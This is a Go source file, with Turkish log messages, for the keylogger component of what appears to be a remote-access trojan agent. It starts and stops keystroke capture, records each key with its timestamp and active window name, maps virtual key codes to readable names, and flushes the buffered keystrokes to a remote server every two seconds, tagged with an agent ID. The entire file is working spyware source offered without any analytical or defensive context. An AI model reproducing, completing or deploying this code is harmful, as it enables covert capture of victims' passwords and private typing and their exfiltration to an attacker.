package main

import (
	"fmt"
	"log"
	"strings"
	"sync"
	"time"
)

// ===== Keylogger =====

var (
	keylogMu      sync.Mutex
	keylogRunning bool
	keylogStopCh  chan struct{}
)

// KeyEvent represents a single keystroke
type KeyEvent struct {
	Key       string `json:"key"`
	Timestamp int64  `json:"ts"`
	Window    string `json:"window,omitempty"`
}

// keylogBuffer accumulates keystrokes and flushes periodically
var (
	keylogBuffer   []KeyEvent
	keylogBufferMu sync.Mutex
)

const keylogFlushInterval = 2 * time.Second
const keylogMaxBuffer = 500

func startKeylogger(data map[string]interface{}) {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if keylogRunning {
		log.Println("[KEYLOG] Zaten aktif")
		return
	}

	log.Println("[KEYLOG] Başlatılıyor...")

	if !platformKeylogAvailable() {
		errMsg := platformKeylogError()
		log.Printf("[KEYLOG] HATA: %s", errMsg)
		sendMessage(map[string]interface{}{
			"type":    "keylog_error",
			"agentId": agentID,
			"data": map[string]interface{}{
				"error": errMsg,
			},
		})
		return
	}

	keylogRunning = true
	keylogStopCh = make(chan struct{})
	stopCh := keylogStopCh

	// Clear buffer
	keylogBufferMu.Lock()
	keylogBuffer = nil
	keylogBufferMu.Unlock()

	sendMessage(map[string]interface{}{
		"type":    "keylog_started",
		"agentId": agentID,
	})

	// Keystroke capture goroutine (platform-specific)
	go platformKeylogCapture(stopCh)

	// Flush goroutine — sends buffered keystrokes to server
	go func() {
		ticker := time.NewTicker(keylogFlushInterval)
		defer ticker.Stop()

		for {
			select {
			case <-stopCh:
				flushKeylogBuffer() // son kalan verileri gönder
				return
			case <-ticker.C:
				flushKeylogBuffer()
			}
		}
	}()

	log.Println("[KEYLOG] Başlatıldı")
}

func stopKeylogger() {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if !keylogRunning {
		return
	}

	if keylogStopCh != nil {
		close(keylogStopCh)
		keylogStopCh = nil
	}
	keylogRunning = false

	sendMessage(map[string]interface{}{
		"type":    "keylog_stopped",
		"agentId": agentID,
	})
	log.Println("[KEYLOG] Durduruldu")
}

func addKeyEvent(key string, window string) {
	keylogBufferMu.Lock()
	defer keylogBufferMu.Unlock()

	keylogBuffer = append(keylogBuffer, KeyEvent{
		Key:       key,
		Timestamp: time.Now().UnixMilli(),
		Window:    window,
	})

	// Prevent memory overflow
	if len(keylogBuffer) >= keylogMaxBuffer {
		go flushKeylogBuffer()
	}
}

func flushKeylogBuffer() {
	keylogBufferMu.Lock()
	if len(keylogBuffer) == 0 {
		keylogBufferMu.Unlock()
		return
	}
	events := keylogBuffer
	keylogBuffer = nil
	keylogBufferMu.Unlock()

	// Convert to sendable format
	eventsData := make([]map[string]interface{}, len(events))
	for i, e := range events {
		eventsData[i] = map[string]interface{}{
			"key":    e.Key,
			"ts":     e.Timestamp,
			"window": e.Window,
		}
	}

	sendMessage(map[string]interface{}{
		"type":    "keylog_data",
		"agentId": agentID,
		"data": map[string]interface{}{
			"events": eventsData,
		},
	})

	log.Printf("[KEYLOG] %d tuş gönderildi", len(events))
}

// ===== Key name mapping (virtual key codes → readable names) =====

var vkNames = map[int]string{
	8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 16: "", 17: "", 18: "",
	19: "[PAUSE]", 20: "[CAPSLOCK]", 27: "[ESC]",
	32: " ", 33: "[PGUP]", 34: "[PGDN]", 35: "[END]", 36: "[HOME]",
	37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
	44: "[PRTSC]", 45: "[INS]", 46: "[DEL]",
	91: "[LWIN]", 92: "[RWIN]",
	112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
	116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
	120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
	144: "[NUMLOCK]", 145: "[SCROLLLOCK]",
	160: "", 161: "", 162: "", 163: "", 164: "", 165: "", // shift/ctrl/alt variants
	186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
	219: "[", 220: "\\", 221: "]", 222: "'",
}

func vkToString(vk int) string {
	if name, ok := vkNames[vk]; ok {
		return name
	}
	// A-Z
	if vk >= 65 && vk <= 90 {
		return strings.ToLower(string(rune(vk)))
	}
	// 0-9
	if vk >= 48 && vk <= 57 {
		return string(rune(vk))
	}
	// Numpad 0-9
	if vk >= 96 && vk <= 105 {
		return string(rune(vk - 48))
	}
	return fmt.Sprintf("[VK_%d]", vk)
}
